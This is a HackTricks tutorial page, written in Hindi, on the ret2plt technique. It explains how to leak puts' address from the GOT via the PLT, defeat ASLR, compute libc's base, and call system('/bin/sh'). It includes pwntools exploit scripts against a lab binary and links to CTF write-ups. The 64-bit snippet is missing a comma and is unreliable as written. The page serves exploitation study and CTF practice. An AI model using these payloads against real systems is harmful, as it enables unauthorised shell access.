# Ret2plt

{{#include ../../../../banners/hacktricks-training.md}}

## Basic Information

इस तकनीक का लक्ष्य **PLT से एक फ़ंक्शन का पता लीक करना** होगा ताकि ASLR को बायपास किया जा सके। इसका कारण यह है कि यदि, उदाहरण के लिए, आप libc से `puts` फ़ंक्शन का पता लीक करते हैं, तो आप **`libc` का बेस कहां है, यह गणना कर सकते हैं** और अन्य फ़ंक्शनों जैसे **`system`** तक पहुँचने के लिए ऑफसेट्स की गणना कर सकते हैं।

यह एक `pwntools` पेलोड के साथ किया जा सकता है जैसे कि ([**यहां से**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
ध्यान दें कि **`puts`** (PLT से पते का उपयोग करते हुए) को GOT (ग्लोबल ऑफसेट टेबल) में स्थित `puts` के पते के साथ कॉल किया जाता है। इसका कारण यह है कि जब `puts` `puts` के GOT एंट्री को प्रिंट करता है, तो यह **एंट्री मेमोरी में `puts` का सटीक पता रखेगी**।

यह भी ध्यान दें कि कैसे `main` का पता एक्सप्लॉइट में उपयोग किया जाता है ताकि जब `puts` अपनी निष्पादन समाप्त करता है, तो **बाइनरी फिर से `main` को कॉल करता है बजाय इसके कि वह बाहर निकल जाए** (ताकि लीक किया गया पता मान्य बना रहे)।

> [!CAUTION]
> ध्यान दें कि इसके काम करने के लिए **बाइनरी को PIE के साथ संकलित नहीं किया जा सकता** या आपको **PIE को बायपास करने के लिए एक लीक मिलना चाहिए** ताकि PLT, GOT और `main` के पते को जान सकें। अन्यथा, आपको पहले PIE को बायपास करना होगा।

आप [**इस बायपास का पूरा उदाहरण यहाँ पा सकते हैं**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)। यह उस उदाहरण से अंतिम एक्सप्लॉइट था:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## अन्य उदाहरण और संदर्भ

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 बिट, ASLR सक्षम लेकिन कोई PIE नहीं, पहला कदम एक ओवरफ्लो को भरना है जब तक कि कैनरी का बाइट 0x00 न हो जाए, फिर puts को कॉल करना और इसे लीक करना है। कैनरी के साथ एक ROP गैजेट बनाया जाता है जो puts को कॉल करता है ताकि GOT से puts का पता लीक किया जा सके और फिर `system('/bin/sh')` को कॉल करने के लिए एक ROP गैजेट।
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 बिट, ASLR सक्षम, कोई कैनरी नहीं, मुख्य में एक चाइल्ड फंक्शन से स्टैक ओवरफ्लो। GOT से puts के पते को लीक करने के लिए puts को कॉल करने के लिए ROP गैजेट और फिर एक गैजेट को कॉल करें।

{{#include ../../../../banners/hacktricks-training.md}}
